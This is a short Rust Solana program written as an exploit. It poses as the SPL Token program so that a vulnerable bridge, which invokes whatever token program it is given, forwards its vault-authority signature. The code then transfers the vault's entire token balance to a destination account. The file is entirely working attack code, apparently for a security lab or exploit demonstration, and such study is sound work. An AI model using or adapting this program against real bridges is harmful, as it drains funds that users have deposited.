use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    program::invoke,
    program_pack::Pack,
    pubkey::Pubkey,
};
use spl_token::state::Account as TokenAccount;

entrypoint!(process_instruction);

// Stands in for the SPL Token program. The vulnerable bridge invokes whatever program is
// passed as `token_program`, forwarding the vault account and the vault-authority PDA's
// signature. The bridge hands us the SPL transfer account layout — [source, destination,
// authority] — so we drain the source's entire balance to the destination, signing with the
// forwarded PDA. The bridge thinks it is moving one redeemed token; it is emptying the vault.
fn process_instruction(_program_id: &Pubkey, accounts: &[AccountInfo], _data: &[u8]) -> ProgramResult {
    let iter = &mut accounts.iter();
    let source = next_account_info(iter)?;
    let destination = next_account_info(iter)?;
    let authority = next_account_info(iter)?;

    let balance = TokenAccount::unpack(&source.data.borrow())?.amount;

    invoke(
        &spl_token::instruction::transfer(
            &spl_token::id(),
            source.key,
            destination.key,
            authority.key,
            &[],
            balance,
        )?,
        &[source.clone(), destination.clone(), authority.clone()],
    )?;

    Ok(())
}
